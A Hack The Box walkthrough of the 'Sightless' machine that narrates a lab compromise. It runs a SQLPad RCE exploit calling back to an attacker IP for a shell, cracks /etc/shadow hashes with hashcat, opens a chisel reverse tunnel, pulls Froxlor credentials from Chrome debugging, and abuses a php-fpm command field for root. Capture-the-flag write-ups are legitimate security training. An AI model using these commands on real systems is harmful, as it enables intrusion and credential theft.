---
title: "Sightless Walkthrough(Hack The Box)"
date: 2025-04-01
draft: true
description: "Walkthrough"
tags: ["Easy", "Linux", "Hack The Box", "Hacking", "Web", "Walkthrough"]
 
---
## Reconnaissance #Linux 
- Got three ports open
- ![[Pasted image 20241221001932.png]]
- FTP, SSH, web server
- The page running on `nginx/1.18.0`
## Enumeration
- The web had a Slightless Titled page while scrolling through I found a link button which redirected to `sqlpad.sightless.htb` website.
- I quickly added it hosts and visited it.
- Found  RCE from google in single search : https://github.com/shhrew/CVE-2022-0944.git
## Exploitation
- By executing it got shell
```
python3 main.py http://sqlpad.sightless.htb/ 10.10.14.12 6001
```
- There was a sqlite file in the current working  directory but there isn't any way to transfer it to our machine cause no versions of python installed
- Then I got to know that this is a docker image that we are in
- ![[Pasted image 20241221022335.png]]
- Cause it is weird to have this directory here.
- Anyway from `/etc/passwd`got know that there are two users
- ![[Pasted image 20241221022519.png]]
- From shadow I got the hash of user michael for cracking. Ignore the root hash i am pretty sure it will waste our time.
- ![[Pasted image 20241221022725.png]]
- After finding the module cracked it with my goto tool
```
 hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
```
- then logged in via SSH
- Got user flag
- ![[Pasted image 20241221023004.png]]
## Privilege Escalation
- Done some enumeration but `ss -tunlp` looked sus
- Too many ports don't ya think
- ![[Pasted image 20241221023121.png]]
- So I decided to forward all the weird looking ports to my machine
- On my machine
```
chisel server -p 7001 --reverse
```
- On the target machine
```
./chisel client 10.10.14.12:7001 R:3306:localhost:3306 R:44771:localhost:44771 R:8080:localhost:8080 R:43047:localhost:43047 R:41049:localhost:41049 R:3000:localhost:3000 R:33060:localhost:33060
```
- It seems that port 8080 is running Froxlor, which required credentials to login
- All the remaining ports seems to suspicious cause most are non-http ones
- Some of the ports are using chrome debugger internally to do some tasks.
- So I opened chrome and navigated to here chrome://inspect/#devices and added all the ports using configure.
- ![[Pasted image 20241221023839.png]]
- Got some hits. I clicked inspect and saw it automatically logging into Froxlor with credentials often
- From the Network tab, got auth request and got the password and username.
- ![[Pasted image 20241221024137.png]]
- Used those creds and got into Froxlor
- While hanging around there discovered a interesting endpoint that could lead to command injection
- ![[Pasted image 20241221024348.png]]
- Created a New PHP version from PHP-FPM versions
- In the php-fpm restart command filled with `cp /root/root.txt /home`
- Then went to settings and then restarted the php-fpm
- After 3-5 min I got the file in the home directory but we need permissions so again using the same method modified the command to `chmod 777 /home/root.txt`
- ![[Pasted image 20241221024823.png]]
- Got the user flag. Then realized from the start I should've changed permissions for root directory itself
- ![[Pasted image 20241221024851.png]]

